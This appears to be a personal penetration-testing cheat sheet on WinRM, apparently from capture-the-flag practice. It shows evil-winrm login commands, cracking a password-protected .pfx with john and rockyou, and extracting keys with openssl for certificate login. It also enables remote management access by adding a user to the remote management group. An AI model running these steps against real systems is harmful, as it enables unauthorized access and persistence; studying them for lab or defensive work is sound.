# WinRM

usually this is a sign that you have to win-rm inside to exfiltrate stuff or enumerate further. You need creds so come back when you have them
- 5986 is SSL so to log in you need to enable the -S flag to evil-winrm
- sometimes you may get .pfx files in which you do the following for authentication

Use the evil-winrm tool to winrm in. Evil-winrm provides a lot of QoL with its upload and download function.

Though for some reason I could never get mimikatz to work in a evil-winrm shell so I usually use it to spawn a normal shell using msfvenom.

```bash
# usual syntax with creds

evil-winrm -i <target ip> -u user -p password


# if password protected

pfx2john <pfx file> > pfx.hash

john pfx.hash -w=rockyou.txt

# Need to convert the pfx file to get both the public cert and the private key

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes

openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem

# with the two above you can use it to login to winrm

evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S -r <hostname>

```

- if you have admin rights or potato (SeImpersonate) powers, you can enable WinRM:

```powershell

# in an elevated powershell
Enable-PSRemoting -Force 

# add user to remote management users grop

net localgroup "remote management users" root /add

```
